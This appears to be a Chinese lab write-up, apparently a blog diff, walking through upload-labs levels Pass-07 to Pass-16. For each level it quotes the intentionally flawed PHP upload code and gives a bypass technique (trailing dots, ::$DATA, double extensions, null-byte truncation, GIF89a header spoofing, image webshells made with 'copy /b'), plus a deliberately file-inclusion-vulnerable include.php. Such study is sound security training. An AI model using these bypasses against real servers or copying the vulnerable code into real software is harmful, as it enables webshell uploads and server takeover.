+        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;此文件不允许上传&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了删除文件末尾的点，因此可以在文件末尾添加点来绕过，还是直接在bp中修改文件名并上传即可。</p>
+<h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;此文件不允许上传&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了对字符串<code>::$DATA</code>的检测，因此使用bp在文件末尾添加对应字符，连接成功。<br>查询之后发现：在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名<br>例如:”<code>phpinfo.php::$DATA</code>“Windows会自动去掉末尾的<code>::$DATA</code>变成”<code>phpinfo.php</code>“</p>
+<h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
+                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;此文件不允许上传&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h2><p>这次发现把前面能用的几种方法全部堵死了。但是可以发现：php文件会先删除.，再删除空格。所以可以修改后缀为<code>webshell.php. .</code>来绕过，经过处理之后变成<code>webshell.php.</code>，这样就可以上传了。</p>
+<h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);
+        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;
+            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;
+            $is_upload &#x3D; true;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h2><p>这次会对违规的部分直接移除，导致上传的php后缀文件后缀缺失。这种情况下，这种移除的情况都可以使用双写绕过，即修改为<code>webshell.pphphp</code>上传，这样上传后的文件后缀就会修改为正常的<code>.php</code>，可以正常连接。</p>
+<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload &#x3D; true;
+        &#125;
+        else&#123;
+            $msg &#x3D; &#39;上传失败！&#39;;
+        &#125;
+    &#125;
+    else&#123;
+        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-9"><a href="#解法-9" class="headerlink" title="解法"></a>解法</h2><p>这次是使用白名单过滤，而且</p>
+<pre class="language-php" data-language="php"><code class="language-php">$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre>
+<p>所以可以使用%00的截断绕过，即：<br>先上传<code>webshell.jpg</code>然后使用bp抓包，将<code>save_path</code>参数修改为以下即可上传：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673689610306-ac532bbc-e2d6-4061-b1f3-377b4bb35972.png" alt="image.png"></p>
+<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>php版本要小于<code>5.3.4</code> 修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为OFF状态</p>
+<h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload &#x3D; true;
+        &#125;
+        else&#123;
+            $msg &#x3D; &quot;上传失败&quot;;
+        &#125;
+    &#125;
+    else&#123;
+        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-10"><a href="#解法-10" class="headerlink" title="解法"></a>解法</h2><p>与上一关相比，这次的<code>save_path</code>参数是在<code>POST</code>内的，但是在<code>POST</code>中加<code>%00</code>参数不行，因为会被解析为字符串，但肯定还是使用<code>00</code>来截断，因此这道题需要修改<code>hex</code>。<br>先上传<code>webshell.jpg</code>文件，修改保存路径，并在末尾添加一个字符<code>a</code>。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771713001-3916d4ff-baf3-42db-b504-02a210287690.png" alt="image.png"><br>然后打开Burpsuite的<code>Hex</code>模式，找到对应<code>a</code>字符的hex值修改为00<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771889576-21235d91-3988-49a5-a490-67217b152112.png" alt="image.png"><br>也可以raw模式下选中a修改hex为00<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771934277-9f2bddb4-fe97-41cf-90ce-64de637342fa.png" alt="image.png"></p>
+<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><pre class="language-php" data-language="php"><code class="language-php">function getReailFileType($filename)&#123;
+    $file &#x3D; fopen($filename, &quot;rb&quot;);
+    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节
+    fclose($file);
+    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);    
+    $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    
+    $fileType &#x3D; &#39;&#39;;    
+    switch($typeCode)&#123;      
+        case 255216:            
+            $fileType &#x3D; &#39;jpg&#39;;
+            break;
+        case 13780:            
+            $fileType &#x3D; &#39;png&#39;;
+            break;        
+        case 7173:            
+            $fileType &#x3D; &#39;gif&#39;;
+            break;
+        default:            
+            $fileType &#x3D; &#39;unknown&#39;;
+        &#125;    
+        return $fileType;
+&#125;
+
+$is_upload &#x3D; false;
+$msg &#x3D; null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_type &#x3D; getReailFileType($temp_file);
+
+    if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123;
+        $msg &#x3D; &quot;文件未知，上传失败！&quot;;
+    &#125;else&#123;
+        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload &#x3D; true;
+        &#125;
+        else&#123;
+            $msg &#x3D; &quot;上传失败&quot;;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-11"><a href="#解法-11" class="headerlink" title="解法"></a>解法</h2><p><code>getReailFileType()</code>函数获取文件的最开始两个字节，来判断文件类型，因此可以使用图片文件欺骗来进行攻击。不同类型文件文件头标准编码是不同的：</p>
+<pre class="language-php" data-language="php"><code class="language-php">JPEG (jpg)，文件头：FF D8 FF
+PNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0a
+GIF (gif)，文件头：47 49 46 38 &#x2F;&#x2F;常用47 49 46 38 39 61 标识GIF89a
+Windows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+python反编译文件pyc的头：03 F3 0D 0A  （实验吧，py的交易会用到）
+pyd的文件头：4D 5A 90 00
+ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件
+rar文件: 52 61 72 21
+7z文件头：37 7A BC AF 27 1C（实验吧，有趣的文件用到了）
+MS Word&#x2F;Excel (xls.or.doc)，文件头：D0CF11E0
+CAD (dwg)，文件头：41433130
+Adobe Photoshop (psd)，文件头：38425053
+Rich Text Format (rtf)，文件头：7B5C727466
+XML (xml)，文件头：3C3F786D6C
+HTML (html)，文件头：68746D6C3E
+Email [thorough only] (eml)，文件头：44656C69766572792D646174653A
+Outlook Express (dbx)，文件头：CFAD12FEC5FD746F
+Outlook (pst)，文件头：2142444E
+MS Access (mdb)，文件头：5374616E64617264204A
+WordPerfect (wpd)，文件头：FF575043
+Postscript (eps.or.ps)，文件头：252150532D41646F6265
+Adobe Acrobat (pdf)，文件头：255044462D312E
+Quicken (qdf)，文件头：AC9EBD8F
+Windows Password (pwl)，文件头：E3828596
+RAR Archive (rar)，文件头：52617221
+Wave (wav)，文件头：57415645
+AVI (avi)，文件头：41564920
+Real Audio (ram)，文件头：2E7261FD
+Real Media (rm)，文件头：2E524D46
+MPEG (mpg)，文件头：000001BA
+MPEG (mpg)，文件头：000001B3
+Quicktime (mov)，文件头：6D6F6F76
+Windows Media (asf)，文件头：3026B2758E66CF11
+MIDI (mid)，文件头：4D546864</code></pre>
+<p>因此，可以在文件前添加<code>GIF89a</code>来迷惑文件检测<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673778087346-92bc1307-babe-4ad4-b1c5-85473c31f677.png" alt="image.png"><br>添加之后上传，上传成功，但是这时候文件后缀是<code>.gif</code>格式，这道题要求的是上传图片马，因此到这里即可，我们可以测试一下是否可以使用。</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>我们在本地创建一个<code>include.php</code>文件</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+&#x2F;*
+本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
+*&#x2F;
+header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);
+$file &#x3D; $_GET[&#39;file&#39;];
+if(isset($file))&#123;
+    include $file;
+&#125;else&#123;
+    show_source(__file__);
+&#125;
+?&gt;</code></pre>
+<p>然后保存到<code>upload-labs</code>的目录下即可（与upload文件夹同级），保存之后，用antsword连接<br><code>http://你的ip/upload-labs/include.php?file=upload/文件名称</code>，如果可以连接则说明图片马上传成功。（注意，这道题上传的图片马会改名字，修改的名字在response传回时会显示）<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673782519464-3fcd10b2-4cc6-4d71-9e53-2326825163ca.png" alt="image.png"></p>
+<h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><pre class="language-php" data-language="php"><code class="language-php">function isImage($filename)&#123;
+    $types &#x3D; &#39;.jpeg|.png|.gif&#39;;
+    if(file_exists($filename))&#123;
+        $info &#x3D; getimagesize($filename);
+        $ext &#x3D; image_type_to_extension($info[2]);
+        if(stripos($types,$ext))&#123;
+            return $ext;
+        &#125;else&#123;
+            return false;
+        &#125;
+    &#125;else&#123;
+        return false;
+    &#125;
+&#125;
+
+$is_upload &#x3D; false;
+$msg &#x3D; null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $res &#x3D; isImage($temp_file);
+    if(!$res)&#123;
+        $msg &#x3D; &quot;文件未知，上传失败！&quot;;
+    &#125;else&#123;
+        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload &#x3D; true;
+        &#125;
+        else&#123;
+            $msg &#x3D; &quot;上传失败&quot;;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-12"><a href="#解法-12" class="headerlink" title="解法"></a>解法</h2><p><code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 <code>FALSE</code> 并产生一条 <code>E_WARNING</code> 级的错误信息。<br>但是也可以使用修改文件头标准编码绕过，所以用和Pass-13相同步骤即可绕过。</p>
+<h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><pre class="language-php" data-language="php"><code class="language-php">function isImage($filename)&#123;
+    &#x2F;&#x2F;需要开启php_exif模块
+    $image_type &#x3D; exif_imagetype($filename);
+    switch ($image_type) &#123;
+        case IMAGETYPE_GIF:
+            return &quot;gif&quot;;
+            break;
+        case IMAGETYPE_JPEG:
+            return &quot;jpg&quot;;
+            break;
+        case IMAGETYPE_PNG:
+            return &quot;png&quot;;
+            break;    
+        default:
+            return false;
+            break;
+    &#125;
+&#125;
+
+$is_upload &#x3D; false;
+$msg &#x3D; null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $res &#x3D; isImage($temp_file);
+    if(!$res)&#123;
+        $msg &#x3D; &quot;文件未知，上传失败！&quot;;
+    &#125;else&#123;
+        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload &#x3D; true;
+        &#125;
+        else&#123;
+            $msg &#x3D; &quot;上传失败&quot;;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-13"><a href="#解法-13" class="headerlink" title="解法"></a>解法</h2><p><code>$image_type = exif_imagetype($filename);</code><br><code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名。<br>可以使用和前两题相同的操作来绕过。</p>
+<h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2><p>如果想要调用<code>exif_imagetype()</code>这个函数需要系统配置文件开启php_exif模块，即<code>php-ini</code>文件中搜索<code>php_exif</code>将行前的分号删除（分号在这个文件中是注释的含义）。</p>
+<h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;]))&#123;
+    &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    $filename &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $filetype &#x3D; $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
+    $tmpname &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+
+    $target_path&#x3D;$UPLOAD_ADDR.basename($filename);
+
+    &#x2F;&#x2F; 获得上传文件的扩展名
+    $fileext&#x3D; substr(strrchr($filename,&quot;.&quot;),1);
+
+    &#x2F;&#x2F;判断文件后缀与类型，合法才进行上传操作
+    if(($fileext &#x3D;&#x3D; &quot;jpg&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))
+        &#123;
+            &#x2F;&#x2F;使用上传的图片生成新的图片
+            $im &#x3D; imagecreatefromjpeg($target_path);
+
+            if($im &#x3D;&#x3D; false)&#123;
+                $msg &#x3D; &quot;该文件不是jpg格式的图片！&quot;;
+            &#125;else&#123;
+                &#x2F;&#x2F;给新图片指定文件名
+                srand(time());
+                $newfilename &#x3D; strval(rand()).&quot;.jpg&quot;;
+                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;
+                imagejpeg($im,$newimagepath);
+                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;
+                unlink($target_path);
+                $is_upload &#x3D; true;
+            &#125;
+        &#125;
+        else
+        &#123;
+            $msg &#x3D; &quot;上传失败！&quot;;
+        &#125;
+
+    &#125;else if(($fileext &#x3D;&#x3D; &quot;png&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;png&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))
+        &#123;
+            &#x2F;&#x2F;使用上传的图片生成新的图片
+            $im &#x3D; imagecreatefrompng($target_path);
+
+            if($im &#x3D;&#x3D; false)&#123;
+                $msg &#x3D; &quot;该文件不是png格式的图片！&quot;;
+            &#125;else&#123;
+                 &#x2F;&#x2F;给新图片指定文件名
+                srand(time());
+                $newfilename &#x3D; strval(rand()).&quot;.png&quot;;
+                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;
+                imagepng($im,$newimagepath);
+                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;
+                unlink($target_path);
+                $is_upload &#x3D; true;               
+            &#125;
+        &#125;
+        else
+        &#123;
+            $msg &#x3D; &quot;上传失败！&quot;;
+        &#125;
+
+    &#125;else if(($fileext &#x3D;&#x3D; &quot;gif&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;gif&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))
+        &#123;
+            &#x2F;&#x2F;使用上传的图片生成新的图片
+            $im &#x3D; imagecreatefromgif($target_path);
+            if($im &#x3D;&#x3D; false)&#123;
+                $msg &#x3D; &quot;该文件不是gif格式的图片！&quot;;
+            &#125;else&#123;
+                &#x2F;&#x2F;给新图片指定文件名
+                srand(time());
+                $newfilename &#x3D; strval(rand()).&quot;.gif&quot;;
+                $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename;
+                imagegif($im,$newimagepath);
+                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path &#x3D; $UPLOAD_ADDR.$newfilename;
+                unlink($target_path);
+                $is_upload &#x3D; true;
+            &#125;
+        &#125;
+        else
+        &#123;
+            $msg &#x3D; &quot;上传失败！&quot;;
+        &#125;
+    &#125;else&#123;
+        $msg &#x3D; &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这道题使用的是图片二次渲染：<code>$im = imagecreatefromjpeg($target_path);</code>该函数接受单个参数<code>$filename</code>，该参数保存图像的名称。返回值：成功时此函数返回图像资源标识符，错误时返回<code>FALSE</code>。<br>首先先上传一个基础图片，上传之后得到的图片下载下来（拖出来），然后准备一个一句话木马文件制<br>作图片马：</p>
+<pre class="language-php" data-language="php"><code class="language-php">copy  two-pass_rendering.jpg &#x2F;b + webshell.php &#x2F;a  muma.jpg</code></pre>
